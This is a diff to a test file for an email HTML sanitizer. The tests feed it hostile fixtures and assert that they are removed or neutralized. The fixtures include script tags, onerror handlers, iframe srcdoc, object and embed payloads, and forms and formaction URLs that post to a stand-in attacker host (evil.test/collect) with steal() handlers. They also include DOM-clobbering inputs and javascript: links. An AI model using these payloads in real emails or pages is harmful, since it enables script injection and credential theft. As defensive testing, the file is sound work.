@@ -1,5 +1,5 @@
-import { render } from '@testing-library/react'
-import { describe, expect, it, vi } from 'vitest'
+import { render, waitFor } from '@testing-library/react'
+import { describe, expect, it } from 'vitest'
 import { EmailHtml, sanitizeEmailHtml } from '@/lib/email-html'
 
 function sanitize(html: string, options: Parameters<typeof sanitizeEmailHtml>[1] = {}) {
@@ -11,18 +11,151 @@ function sanitize(html: string, options: Parameters<typeof sanitizeEmailHtml>[1]
   })
 }
 
+function sanitizeToElement(html: string): HTMLDivElement {
+  // A template's DocumentFragment has a separate inert owner document in jsdom,
+  // which makes jest-dom's HTMLElement realm checks fail. A div models the
+  // component's eventual innerHTML parse without crossing realms.
+  const container = document.createElement('div')
+  container.innerHTML = sanitize(html)
+  return container
+}
+
 describe('email HTML safety boundary', () => {
-  it('removes active content, event handlers, embedded documents and forms', () => {
+  it('removes active content, event handlers and embedded documents', () => {
     const clean = sanitize(`
       <script>globalThis.pwned = true</script>
       <img src="x" onerror="globalThis.pwned = true">
       <iframe srcdoc="<script>alert(1)</script>"></iframe>
-      <form action="https://evil.test"><input name="password"></form>
       <object data="https://evil.test/payload"></object>
       <embed src="https://evil.test/payload">
     `)
 
-    expect(clean).not.toMatch(/script|onerror|iframe|srcdoc|<form|<input|object|embed/i)
+    expect(clean).not.toMatch(/script|onerror|iframe|srcdoc|object|embed/i)
+  })
+
+  it('keeps common form controls and their presentation state', () => {
+    const content = sanitizeToElement(`
+      <fieldset id="preferences" class="control-group" disabled>
+        <legend>Verification options</legend>
+        <label for="plan" class="field-label">Plan</label>
+        <select id="plan" name="plan" size="2" multiple disabled>
+          <optgroup label="Paid plans" disabled>
+            <option value="pro" selected>Pro</option>
+            <option value="max">Max</option>
+          </optgroup>
+        </select>
+        <textarea id="notes" name="notes" rows="3" cols="24"
+          placeholder="Optional note" readonly disabled>Draft</textarea>
+        <button id="verify" type="submit" value="verify" disabled>Verify identity</button>
+        <input id="remember" type="checkbox" value="yes" checked disabled>
+      </fieldset>
+    `)
+
+    expect(content.querySelector('fieldset#preferences')).toHaveClass('control-group')
+    expect(content.querySelector('fieldset#preferences')).toHaveAttribute('disabled')
+    expect(content.querySelector('legend')).toHaveTextContent('Verification options')
+    expect(content.querySelector('label.field-label')).toHaveAttribute('for', 'plan')
+
+    const select = content.querySelector('select#plan')
+    expect(select).toHaveAttribute('name', 'plan')
+    expect(select).toHaveAttribute('size', '2')
+    expect(select).toHaveAttribute('multiple')
+    expect(select).toHaveAttribute('disabled')
+    expect(select?.querySelector('optgroup')).toHaveAttribute('label', 'Paid plans')
+    expect(select?.querySelector('optgroup')).toHaveAttribute('disabled')
+    expect(select?.querySelector('option[value="pro"]')).toHaveAttribute('selected')
+    expect(select).toHaveTextContent('Pro')
+    expect(select).toHaveTextContent('Max')
+
+    const textarea = content.querySelector('textarea#notes')
+    expect(textarea).toHaveAttribute('rows', '3')
+    expect(textarea).toHaveAttribute('cols', '24')
+    expect(textarea).toHaveAttribute('placeholder', 'Optional note')
+    expect(textarea).toHaveAttribute('readonly')
+    expect(textarea).toHaveAttribute('disabled')
+    expect(textarea).toHaveTextContent('Draft')
+
+    // Submit/reset behavior is neutralized without removing the button itself.
+    expect(content.querySelector('button#verify')).toHaveAttribute('type', 'submit')
+    expect(content.querySelector('button#verify')).toHaveAttribute('value', 'verify')
+    expect(content.querySelector('button#verify')).toHaveAttribute('disabled')
+    expect(content.querySelector('button#verify')).toHaveTextContent('Verify identity')
+    expect(content.querySelector('input#remember')).toHaveAttribute('type', 'checkbox')
+    expect(content.querySelector('input#remember')).toHaveAttribute('value', 'yes')
+    expect(content.querySelector('input#remember')).toHaveAttribute('checked')
+    expect(content.querySelector('input#remember')).toHaveAttribute('disabled')
+  })
+
+  it('replaces forms with inert containers while retaining layout and children', () => {
+    const content = sanitizeToElement(`
+      <form id="verification-form" class="cta-shell rounded"
+        style="padding: 12px; color: #123456"
+        action="https://evil.test/collect" method="post" onsubmit="steal()">
+        <label for="identity">Identity</label>
+        <input id="identity" name="identity" value="person-123" onfocus="steal()">
+        <button id="continue" type="submit" formaction="https://evil.test/alternate"
+          onclick="steal()">Continue</button>
+      </form>
+    `)
+
+    const inertForm = content.querySelector<HTMLElement>('#verification-form')
+    expect(content.querySelector('form')).toBeNull()
+    expect(inertForm).not.toBeNull()
+    expect(inertForm).toHaveClass('cta-shell', 'rounded')
+    expect(inertForm?.style.padding).toBe('12px')
+    expect(inertForm).toHaveTextContent('Identity')
+    expect(inertForm).toHaveTextContent('Continue')
+    expect(inertForm).not.toHaveAttribute('action')
+    expect(inertForm).not.toHaveAttribute('method')
+    expect(content.querySelector('#continue')).not.toHaveAttribute('formaction')
+    expect(content.querySelector('#verification-form')).not.toHaveAttribute('onsubmit')
+    expect(content.querySelector('#identity')).not.toHaveAttribute('onfocus')
+    expect(content.querySelector('#continue')).not.toHaveAttribute('onclick')
+    expect(content.querySelector('input#identity')).toHaveAttribute('value', 'person-123')
+  })
+
+  it('does not drop input-based call-to-action buttons', () => {
+    const content = sanitizeToElement(`
+      <input id="persona-cta" class="button primary" style="background: #111; color: #fff"
+        type="submit" value="Continue" formaction="https://evil.test/collect" onclick="steal()">
+    `)
+
+    const cta = content.querySelector<HTMLInputElement>('input#persona-cta')
+    expect(cta).not.toBeNull()
+    expect(cta).toHaveAttribute('type', 'submit')
+    expect(cta).toHaveAttribute('value', 'Continue')
+    expect(cta).toHaveClass('button', 'primary')
+    expect(cta?.style.background).not.toBe('')
+    expect(cta).not.toHaveAttribute('formaction')
+    expect(cta).not.toHaveAttribute('onclick')
+  })
+
+  it('neutralizes clobbering form controls without losing their content', () => {
+    const content = sanitizeToElement(`
+      <form id="clobbered">
+        <input name="attributes" value="attributes">
+        <input name="childNodes" value="childNodes">
+        <input name="replaceWith" value="replaceWith">
+      </form>
+    `)
+
+    expect(content.querySelector('form')).toBeNull()
+    expect(content.querySelector('#clobbered.email-form')?.querySelectorAll('input')).toHaveLength(3)
+    expect(content.textContent).not.toContain('[object HTMLInputElement]')
+  })
+
+  it('prevents non-img controls from bypassing the remote-resource policy', () => {
+    const content = sanitizeToElement(`
+      <input id="image-cta" type="image" src="https://tracker.test/button.png" alt="Continue">
+      <input id="file-picker" type="file" capture="camera">
+    `)
+
+    const imageCta = content.querySelector<HTMLInputElement>('#image-cta')
+    expect(imageCta).toHaveAttribute('type', 'button')
+    expect(imageCta).toHaveAttribute('value', 'Continue')
+    expect(imageCta).not.toHaveAttribute('src')
+    expect(content.querySelector('#file-picker')).toHaveAttribute('disabled')
+    expect(content.querySelector('#file-picker')).not.toHaveAttribute('capture')
   })
 
   it('renders remote HTTPS images with privacy and loading attributes', () => {
@@ -77,6 +210,20 @@ describe('email HTML safety boundary', () => {
     expect(clean).not.toMatch(/tracker\.test|@import|position:|z-index:|background-image|url\s*\(/i)
   })
 
+  it('drops iframe-height-dependent CSS that can create resize feedback loops', () => {
+    const clean = sanitize(`
+      <style>
+        .viewport { height: 100vh; min-height: 100dvh; color: red; }
+        @media (min-height: 300px) { .viewport { padding: 20px; } }
+      </style>
+      <div class="viewport" style="max-height: 90svh; color: blue">Content</div>
+    `)
+
+    expect(clean).toContain('color: red')
+    expect(clean).toContain('color: blue')
+    expect(clean).not.toMatch(/(?:d|l|s)?vh\b|@media\s*\([^)]*height/i)
+  })
+
   it('normalizes safe links and strips executable or relative URLs', () => {
     const clean = sanitize(`
       <a href="javascript:alert(1)" target="_blank">unsafe</a>
@@ -94,23 +241,30 @@ describe('email HTML safety boundary', () => {
     expect(clean).toContain('href="mailto:help@example.test"')
   })
 
-  it('renders sanitized markup inside an isolated Shadow DOM', () => {
-    const observe = vi.fn()
-    const disconnect = vi.fn()
-    vi.stubGlobal('ResizeObserver', class ResizeObserver {
-      observe = observe
-      unobserve() {}
-      disconnect = disconnect
-    })
+  it('renders sanitized markup inside a sandboxed iframe', async () => {
     const { container } = render(
-      <EmailHtml html={'<p id="message">Hello</p><img src="https://images.example.test/logo.png" onerror="alert(1)">'} />,
+      <EmailHtml html={'<p id="message">Hello</p><script>alert(1)</script><img src="https://images.example.test/logo.png" onerror="alert(2)">'} />,
     )
-    const host = container.querySelector<HTMLElement>('[data-email-html-host]')
-    expect(host?.shadowRoot).not.toBeNull()
-    expect(host?.shadowRoot?.querySelector('#message')).toHaveTextContent('Hello')
-    expect(host?.shadowRoot?.innerHTML).not.toContain('onerror')
-    expect(host?.shadowRoot?.querySelector('img')).toHaveAttribute('referrerpolicy', 'no-referrer')
-    expect(observe).toHaveBeenCalledOnce()
-    vi.unstubAllGlobals()
+    const frame = container.querySelector<HTMLIFrameElement>('iframe')
+    expect(frame).not.toBeNull()
+    expect(frame).toHaveAttribute('sandbox')
+
+    const sandboxTokens = new Set((frame?.getAttribute('sandbox') || '').trim().split(/\s+/).filter(Boolean))
+    expect([...sandboxTokens].sort()).toEqual([
+      'allow-popups',
+      'allow-popups-to-escape-sandbox',
+      'allow-same-origin',
+    ])
+
+    await waitFor(() => {
+      expect(frame?.contentDocument?.querySelector('#message')).toHaveTextContent('Hello')
+    })
+    const frameDocument = frame?.contentDocument
+    expect(frameDocument?.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content'))
+      .toContain("script-src 'none'")
+    expect(frameDocument?.querySelector('meta[name="referrer"]')).toHaveAttribute('content', 'no-referrer')
+    expect(frameDocument?.querySelector('script')).toBeNull()
+    expect(frameDocument?.documentElement.innerHTML).not.toMatch(/\bonerror\s*=/i)
+    expect(frameDocument?.querySelector('img')).toHaveAttribute('referrerpolicy', 'no-referrer')
   })
 })
